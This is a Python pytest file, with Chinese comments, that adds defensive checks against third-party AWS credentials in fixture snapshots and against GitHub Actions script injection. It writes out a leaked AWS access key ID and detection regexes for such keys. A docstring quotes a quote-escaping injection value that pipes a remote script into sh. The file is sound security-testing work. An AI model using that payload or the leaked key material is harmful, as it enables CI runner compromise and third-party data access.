"""两条卫生闸：第三方凭据不许进语料、用户输入不许拼进 shell。

两个洞都是**没有任何东西在守**才活到今天的，所以先加闸再谈别的。

## 一、fixtures 里的第三方 AWS 签名

实测 11 份已提交快照（developers.brevo.com / docs.bigcommerce.com /
docs.canvasmedical.com / help.close.com）含 `AKIA6KXJSKKNFOCF7G4B` +
`X-Amz-Signature=`，签发 2026-09-04、有效期 604800s（7 天）——
也就是说**公开仓库里有一条当时还能用的、授予第三方 S3 对象读权限的 URL**。

项目此前知道 fixtures 里有 presigned URL（§8.1 的漂移分支就叫
`presigned_expiring`），但只当成「快照会过期」的新鲜度问题。
**过期解决的是可复现性，不解决「我们把别人的凭据材料再分发了」。**

## 二、workflow 里的脚本注入

`audit-my-domain.yml` 原来是 `uv run geo-audit "${{ inputs.domain }}"`。
`${{ }}` 由 Actions 在**生成 shell 脚本时**插值，双引号挡不住。
"""

from __future__ import annotations

import gzip
import json
import re
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
FIXTURES = REPO / "fixtures"
WORKFLOWS = REPO / ".github" / "workflows"

#: 只认 AWS 签名那一族。**刻意不含 token / sig / signature** ——
#: 第一版收了它们，直接把 32 份语料改坏（这些词在普通文档正文里到处都是，
#: 有的还被换成更长的占位符）。判定语料多改一个字节就多一次测量假象。
CREDENTIAL_PATTERNS = (
    rb"AKIA[0-9A-Z]{16}",
    rb"ASIA[0-9A-Z]{16}",
    rb"X-Amz-Signature=(?!REDACTED)",
    rb"X-Amz-Credential=(?!REDACTED)",
)

needs_fixtures = pytest.mark.skipif(
    not (FIXTURES / "index.json").exists(), reason="fixtures/index.json 不在"
)


@needs_fixtures
def test_no_third_party_credentials_in_snapshot_bodies() -> None:
    """945 份快照的正文里不许有第三方 AWS 签名或访问密钥 ID。"""
    pat = re.compile(b"|".join(CREDENTIAL_PATTERNS))
    snaps = json.loads((FIXTURES / "index.json").read_text(encoding="utf-8"))["snapshots"]
    hits: list[str] = []
    for url, entry in snaps.items():
        path = FIXTURES / (entry["path"] + ".body.gz")
        if not path.exists():
            continue
        found = pat.findall(gzip.decompress(path.read_bytes()))
        if found:
            hits.append(f"{url} — {len(found)} 处")
    assert hits == [], (
        "这些快照里有第三方凭据材料，而它们会随公开仓库分发：\n  "
        + "\n  ".join(hits)
        + "\n落盘侧的 redact_credentials() 应当拦住；已入库的用脚本清洗并重算 raw_md5。"
    )


@needs_fixtures
def test_no_credentials_in_snapshot_metadata() -> None:
    """meta.json 里也不许有 —— 正文脱敏了但 header/URL 留着一样是分发。"""
    pat = re.compile("|".join(p.decode() for p in CREDENTIAL_PATTERNS))
    hits = [
        str(p.relative_to(REPO))
        for p in FIXTURES.rglob("*.meta.json")
        if pat.search(p.read_text(encoding="utf-8", errors="replace"))
    ]
    assert hits == [], "元数据里有凭据：\n  " + "\n  ".join(hits[:10])


@needs_fixtures
def test_redaction_is_wired_into_the_write_path_not_just_available() -> None:
    """脱敏函数必须**无条件**接在落盘路径上。

    上一版只在 `if contact:` 里做脱敏，于是 `--url` 单条补录那条路径完全不过
    脱敏层 —— 一个「有函数但没接上」的洞，跟没有函数一样。
    """
    src = (REPO / "src" / "geo_audit" / "fixtures.py").read_text(encoding="utf-8")
    put = src[src.index("# 脱敏必须在算 total") : src.index("total = len(body)")]
    assert "redact_credentials" in put, "凭据脱敏没接在落盘路径上"
    # 必须在 contact 判断**之外**：contact 为空时也要脱敏
    cred_at = put.index("redact_credentials")
    contact_gate = put.index("if contact and body")
    assert cred_at < contact_gate, "凭据脱敏被塞进了 `if contact` 里 —— 那条路径会漏"


#: 用户可控的插值来源。``github.event.*`` 同样危险（PR 标题/分支名）。
_UNTRUSTED = re.compile(r"\$\{\{\s*(?:inputs|github\.event)\.")


def scan_run_blocks(text: str) -> list[int]:
    """返回把不受信任输入插进 ``run:`` 脚本正文的行号。

    ``run:`` 块的结束判据是**该 key 的缩进**，不是行首缩进 —— ``- run:`` 的
    key 在 ``- `` 之后，而它的兄弟键（``env:`` / ``with:``）与它同缩进。
    第一版按行首算，于是 ``env:`` 块被算进 ``run:`` 里，把正确的写法误报了。
    """
    bad: list[int] = []
    in_run = False
    key_indent = 0
    for i, line in enumerate(text.splitlines(), 1):
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        m = re.match(r"(-\s*)?run:", stripped)
        if m:
            in_run = True
            key_indent = line.index("run:")
            if _UNTRUSTED.search(line):
                bad.append(i)
            continue
        if in_run:
            indent = len(line) - len(line.lstrip())
            if indent <= key_indent:
                in_run = False
            elif _UNTRUSTED.search(line):
                bad.append(i)
    return bad


def test_workflow_inputs_never_interpolate_into_shell() -> None:
    """用户输入不许出现在 ``run:`` 的脚本正文里，只能走 ``env:``。

    ``${{ }}`` 由 Actions 在生成 shell 脚本时插值，双引号挡不住：
    输入 `x"; curl evil.sh | sh; "` 就跳出了引号。
    """
    bad: list[str] = []
    for wf in sorted(WORKFLOWS.glob("*.yml")):
        text = wf.read_text(encoding="utf-8")
        lines = text.splitlines()
        for n in scan_run_blocks(text):
            bad.append(f"{wf.name}:{n} {lines[n - 1].strip()[:70]}")
    assert bad == [], (
        "这些地方把用户输入直接插进了 shell 脚本（GitHub Actions 脚本注入）：\n  "
        + "\n  ".join(bad)
        + '\n改法：放进 `env:`，脚本里用 "$VAR" 取。'
    )


def test_the_injection_gate_would_catch_the_original_pattern() -> None:
    """闸门自检：**用的是同一个 scan_run_blocks**，不是复制一份逻辑。

    复制一份的话，自检绿了也证明不了真闸门是对的 —— 那正是第一版的毛病。
    """
    vulnerable = (
        "jobs:\n  a:\n    steps:\n      - run: >\n"
        '          uv run geo-audit "${{ inputs.domain }}"\n'
    )
    safe = (
        "jobs:\n  a:\n    steps:\n      - run: |\n"
        '          uv run geo-audit "$D"\n        env:\n          D: ${{ inputs.domain }}\n'
    )
    assert scan_run_blocks(vulnerable), "有洞的写法没被抓到，闸是坏的"
    assert scan_run_blocks(safe) == [], (
        f"走 env 的安全写法被误报（行 {scan_run_blocks(safe)}）—— env: 块被算进 run: 了"
    )
